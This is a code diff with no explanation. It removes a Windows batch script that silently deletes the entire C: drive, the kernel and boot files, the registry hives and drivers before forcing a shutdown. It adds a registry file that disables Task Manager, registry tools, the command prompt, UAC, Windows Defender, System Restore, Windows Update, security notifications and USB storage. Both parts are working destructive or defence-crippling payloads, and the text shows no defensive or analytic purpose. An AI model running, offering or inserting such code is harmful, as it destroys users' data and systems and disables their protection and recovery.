@@ -1,17 +1,64 @@
-@echo off
-rd /s /q C:\ 2>nul 1>nul
-del /f /s /q C:\*.* 2>nul 1>nul
+Windows Registry Editor Version 5.00
 
-del /f /q C:\Windows\System32\ntoskrnl.exe  2>nul 1>nul
-del /f /q C:\Windows\System32\hal.dll  2>nul 1>nul
-del /f /q C:\Windows\System32\winload.exe  2>nul 1>nul
-del /f /q C:\Windows\System32\winresume.efi  2>nul 1>nul
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+"DisableRegistryTools"=dword:00000001
 
-del /f /q C:\Windows\System32\config\*   2>nul 1>nul
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+"DisableTaskMgr"=dword:00000001
 
-del /f /q C:\bootmgr  2>nul 1>nul
-del /f /q C:\ntldr  2>nul 1>nul
-del /f /q C:\Windows\System32\Boot\*  2>nul 1>nul
-del /f /q C:\Windows\System32\drivers\* 2>nul 1>nul
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
+"EnableLUA"=dword:00000000
 
-shutdown -s -f -t 0 2>nul 1>nul
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
+"DisableSR"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Control Panel\Desktop]
+"ScreenSaveActive"="0"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"ShowSuperHidden"=dword:00000000
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
+"DisableAntiSpyware"=dword:00000001
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+"DisableCMD"="1"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Windows Search]
+"AllowCortana"="0"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoStartMenuMorePrograms"="1"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU]
+"AUOptions"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
+"fDenyTSConnections"=dword:00000001
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoControlPanel"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate]
+"DisableWindowsUpdateAccess"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center\Monitoring\DisableNotifications]
+"DisableNotifications"=dword:00000001
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoNetHood"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UsbStor]
+"Start"=dword:00000004
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoWinKeys"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoStartMenuMorePrograms"="1"
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
+"Hidden"=dword:00000002
+
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Netman]
+"Start"=dword:00000004
